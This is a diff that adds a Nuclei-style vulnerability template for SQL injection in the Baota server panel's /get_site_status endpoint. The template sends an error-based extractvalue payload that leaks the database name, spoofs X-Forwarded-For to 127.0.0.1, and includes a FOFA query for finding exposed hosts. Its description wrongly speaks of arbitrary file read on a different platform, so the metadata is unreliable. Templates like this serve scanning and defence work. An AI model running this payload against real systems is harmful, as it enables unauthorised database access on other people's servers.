@@ -1,0 +1,25 @@
+id: baota-sqli
+
+info:
+  name: 宝塔sql
+  author: god
+  severity: high
+  description: 真内控国产化开发平台 preview 任意文件读取
+  metadata:
+    fofa-query: body="js/npm.echarts.js"
+  tags: 宝塔
+
+http:
+- raw:
+  - |
+    GET /get_site_status?server_name='-extractvalue(1,concat(0x7e,database()))-' HTTP/1.1
+    Host: {{Hostname}}
+    X-Forwarded-For: 127.0.0.1
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "~"
+        - "XPATH syntax error:"
+      condition: and
